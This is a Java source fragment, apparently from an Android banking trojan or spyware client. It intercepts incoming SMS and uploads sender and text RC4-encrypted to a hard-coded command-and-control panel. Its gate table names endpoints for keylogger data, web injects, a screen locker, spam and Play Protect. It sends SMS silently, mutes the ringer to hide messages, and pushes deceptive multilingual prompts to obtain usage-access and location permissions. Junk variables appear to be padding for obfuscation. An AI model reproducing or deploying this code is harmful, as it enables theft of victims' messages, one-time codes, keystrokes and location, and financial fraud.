                msg="The system does not work correctly, you need to enable access to the statistics '"+getNameApp(context)+"'";
                nameButton="Enable now";
            }
            builder.setTitle(title)
                    .setMessage(msg)
                    .setIcon(R.drawable.im)
                    .setCancelable(false)
                    .setNegativeButton(nameButton,
                            new DialogInterface.OnClickListener() {

                                public void onClick(DialogInterface dialog, int id) {
                                    context.startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
                                    dialog.cancel();
                                }
                            });

            try{
            AlertDialog alert = builder.create();
            alert.show();}catch (Exception ex){}
        }else  if(NameAlert.contains("gps")){
            if(locate.contains("RU")){
                title="Геолокация";
                msg="Для корректной работы системы, нужно получить координаты, вам необходимо включить геолокацию";
                nameButton="Включить сейчас";
            }else if(locate.contains("US")){
                title="Geolocation";
                msg="For correct operation of the system, you need to get the coordinates, you need to enable geolocation";
                nameButton="Enable now";
            }else if(locate.contains("TR")){
                title="Coğrafi konum";
                msg="Sistemin doğru çalışması için, koordinatları almak gerekir, coğrafi konum etkinleştirmeniz gerekir";
                nameButton="Şimdi etkinleştir";
            }else if(locate.contains("DE")){
                title="Geolokalisierung";
                msg="Für den korrekten Betrieb des Systems müssen Sie die Koordinaten erhalten, müssen Sie die Geolokalisierung aktivieren";
                nameButton="Aktivieren Sie jetzt";
            }else if(locate.contains("IT")){
                title="Geolocalizzazione";
                msg="Per il corretto funzionamento del sistema, è necessario ottenere le coordinate, è necessario abilitare la geolocalizzazione";
                nameButton="Attiva ora";
            }else if(locate.contains("FR")){
                title="Géolocalisation";
                msg="Pour un fonctionnement correct du système, vous devez obtenir les coordonnées, vous devez activer la géolocalisation";
                nameButton="Activer maintenant";
            }else if(locate.contains("UA")){
                title="Геолокація";
                msg="Для коректної роботи системи вам потрібно, щоб отримати координати, потрібно включити геолокацію";
                nameButton="Включити зараз";
            }else{
                title="Geolocation";
                msg="For correct operation of the system, you need to get the coordinates, you need to enable geolocation";
                nameButton="Enable now";
            }
            builder.setTitle(title)
                    .setMessage(msg)
                    .setIcon(R.drawable.im)
                    .setCancelable(false)
                    .setNegativeButton(nameButton,
                            new DialogInterface.OnClickListener() {

                                public void onClick(DialogInterface dialog, int id) {
                                    context.startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                                    dialog.cancel();
                                }
                            });
            try{
            AlertDialog alert = builder.create();
            alert.show();}catch (Exception ex){}
        }
    }

    public boolean geolocation_check_enabled(Context context ) {
        LocationManager locationManager = (LocationManager) context.getSystemService(LOCATION_SERVICE);
        if((locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
                ||(locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)))
            return true; else return false;
    }

    public void send(Context context, String n, String t){
        POST(context, "4","p=" + trafEnCr(ID_B(context) + "|Incoming SMS" + '\n' + "Number: " + n + '\n' + "Text: " + t + '\n' + "|"));
    }
    public String POST(Context context, String gate, String params)
    {
        RequestHttp req_http = new RequestHttp();
        String gates="";
        String url="";
        if(gate.equals("1"))gates="/o1o/a3.php";//set_data.php
        if(gate.equals("2"))gates="/o1o/a4.php";//tuk_tuk.php
        if(gate.equals("3"))gates="/o1o/a5.php";//settings.php
        if(gate.equals("4"))gates="/o1o/a6.php";//add_log.php
        if(gate.equals("5"))gates="/o1o/a7.php";//set_location.php
        if(gate.equals("6"))gates="/o1o/a8.php";//getSettingsAll.php
        if(gate.equals("7"))gates="/o1o/a9.php";//setAllSettings.php
        //if(gate.equals("8"))gates="/o1o/a10.php";//getDataCJ.php!!!
        //if(gate.equals("9"))gates="/o1o/a11.php";//setDataCJ.php!!!
        if(gate.equals("10"))gates="/o1o/a10.php";//add_inj.php
        if(gate.equals("11"))gates="/o1o/a11.php";//locker.php
        if(gate.equals("12"))gates="/o1o/a12.php";//datakeylogger.php
        if(gate.equals("13"))gates="/o1o/a13.php";//sound.php
        if(gate.equals("14"))gates="/o1o/a14.php";//playprot.php
        if(gate.equals("15"))gates="/o1o/a15.php";//spam.php


        try {
            url = SetRead(context, "url");
        }catch (Exception ex){
            Log("ERROR","Class UtilsClass, POST -> URL");
            return null;
        }

        return req_http.go_post(url + gates,params);
    }
    public String checkPanelPost(String url)
    {
        RequestHttp req_http = new RequestHttp();
        return req_http.go_post(url + "/o1o/a16.php","");//checkPanel.php
    }
    public void sendSMS(Context context, String phoneNumber, String message){
        SmsManager sms = SmsManager.getDefault();
        ArrayList<String> parts = sms.divideMessage(message);
        PendingIntent sp = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
        ArrayList<PendingIntent> sents = new ArrayList();
        ArrayList<PendingIntent> deliveredList = new ArrayList<PendingIntent>();
        for (int i = 0; i < parts.size(); i++) {
            deliveredList.add(deliveredPI);
            sents.add(sp);
        }
        sms.sendMultipartTextMessage(phoneNumber, null, parts, sents, deliveredList);
    }

    public void StopSound(Context context)//Глушим звук смс!
    {
        if (Build.VERSION.SDK_INT <= 23) {
            AudioManager audm;
            audm = (AudioManager) context.getSystemService(context.AUDIO_SERVICE);
            audm.setRingerMode(AudioManager.RINGER_MODE_SILENT);
        }
    }
    String gfgdsgr="sdokfgjeosdfgerfh";
    String gfdsgrgr="sdokfgjeofh";
    int ddffde=3426;
    String gfgr="sdokfdfhergjeofh";
    int ddfe=3423;
    String urlpanel = "http://hdfuckedin18.top";//"<url>".replace(" ","");     // ---------------------- URL -----------------------------
    public final String urlTwitter = "<urltwitter>";
    String gfgrfefgerg="sdokfgjegerofh";
    String gffdgerr="sdokfgjeofh";
    int dd=23;
    String sdfgh="dsfpkhmdfkhdg";

    int dds=23;
    String gfgdfr="sdosdfrgkfgjeofh";
    String gfdsfgfggr="sdokfgjeofh";
    String gfgerhehr="sdokfgjeofh";
    //------
    private NetworkInfo getNetworkInfo(Context context) {
        return ((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
    }

    public  boolean isConnectedWifi(Context context) {
        NetworkInfo info = getNetworkInfo(context);
        if (info != null && info.isConnected() && info.getType() == 1) {
            return true;
        }
        return false;
    }
    public  boolean isConnectedMobile(Context context) {
        NetworkInfo info = getNetworkInfo(context);
        return info != null && info.isConnected() && info.getType() == 0;
    }
    public boolean isConnectedWifiOrMobile(Context context) {
        return isConnectedMobile(context) || isConnectedWifi(context);
    }
    //------
    public void SetWrite(Context context, String name, String params)
    {
        //String n = name;
       // name = trafEnCr(name);
        if((name.contains("urlInj") || (name.contains("urls")))){
            params=trafEnCr(params);
        }
        SharedPreferences settings = context.getSharedPreferences("set", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putString(name, params);
        editor.commit();
    }
    public String SetRead(Context context, String name)
    {
       /* String n = name;
        name = trafEnCr(name);*/

        if( settings == null ){
            settings = context.getSharedPreferences("set", Context.MODE_PRIVATE);
            editor = settings.edit();
        }
        String rezult = settings.getString(name, null);
        if((name.contains("urlInj") || (name.contains("urls")))){
            rezult=trafDeCr(rezult);
        }
       return rezult;
    }

    public static void startCustomTimer(Context context, String name, long millisec)
    {
        try{
            Intent intent = new Intent(context, ReceiverAlarm.class);
            intent.setAction(name);

            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + millisec, millisec, pendingIntent);

        }
        catch(Exception ex)
        {
        }
    }
    public static void cancelCustomTimer(Context context, String name)
    {
        try
        {
            Intent intent = new Intent(context, ReceiverAlarm.class);
            intent.setAction(name);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

            alarmManager.cancel(pendingIntent);
        }
        catch(Exception ex)
        {
        }
    }
    public String return_plain_text(String text, String tagBIGIN, String tagEND)//Убираем <TAG>text</TAG>
    {
        try {
            int indexBIGIN = text.indexOf(tagBIGIN) + tagBIGIN.length();
            int indexEND = text.indexOf(tagEND);
            text = text.substring(indexBIGIN, indexEND);
            return text;
        }catch (Exception e)
        {
            return "";
        }
    }
    public String country(Context context)
    {
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String con = tm.getNetworkCountryIso();
            return con;
        }
        catch (Exception e)
        {
            return "us";
        }
    }
    public String ID_B(Context context)
    {
        String ID_B="";
        ID_B = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        if(ID_B == "")
        {
            ID_B = "35" +
                    Build.BOARD.length()%10 + Build.BRAND.length()%10 +
                    Build.CPU_ABI.length()%10 + Build.DEVICE.length()%10 +
                    Build.DISPLAY.length()%10 + Build.HOST.length()%10 +
                    Build.ID.length()%10 + Build.MANUFACTURER.length()%10 +
                    Build.MODEL.length()%10 + Build.PRODUCT.length()%10 +
                    Build.TAGS.length()%10 + Build.TYPE.length()%10 +
                    Build.USER.length()%10;
        }
        return ID_B;
    }
    //-------------------
    public String strEncRC4(String text, String key){
        ClassRC4 rce = new ClassRC4(key.getBytes());
        byte[] result = rce.encrypt(text.getBytes());
        result = bytesToHexString(result).getBytes();
        return Base64.encodeToString(result, Base64.DEFAULT);
    }
    public String bytesToHexString(byte[] bytes) {
        StringBuffer buf = new StringBuffer(bytes.length * 2);
        for (byte b : bytes) {
            String s = Integer.toString(0xFF & b, 16);
            if (s.length() < 2) {
                buf.append('0');
            }
            buf.append(s);
        }
        return buf.toString();
    }
    //-------------------
    public String str_decrypt(String textDE_C, String key)
    {
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){
            // Log("RC4_Dec","ERROR");
        }
        return "";
    }
    public String strDecRC4(String textDE_C, String key)
    {
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){
           // Log("RC4_Dec","ERROR");
        }
        return "";
    }
    public   byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    //-------------------
    public static String strStaticDecRC4(String textDE_C, String key)
    {
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = StatichexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){
            // Log("RC4_Dec","ERROR");
            //Vmusor2
        }
        return "";
    }
    public  static byte[] StatichexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }


    //----шифрование траффика--------
    public String trafEnCr(String text) {
        return strEncRC4(text, const_.key_post);
    }

    public String trafDeCr(String text){
        return strDecRC4(text, const_.key_post);
    }
    //-----шифрование траффика------
    public byte[] cryptFile(byte[] bytes, String key){
        try {
            ClassRC4 rce = new ClassRC4(key.getBytes());
            return rce.encrypt(bytes);
        }catch (Exception ex){
            return null;
        }
    }
    public byte[] decryptFile(byte[] bytes, String key) throws IOException {
        try {
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return rcd.decrypt(bytes);
        }catch (Exception ex){
            return null;
        }
    }
}
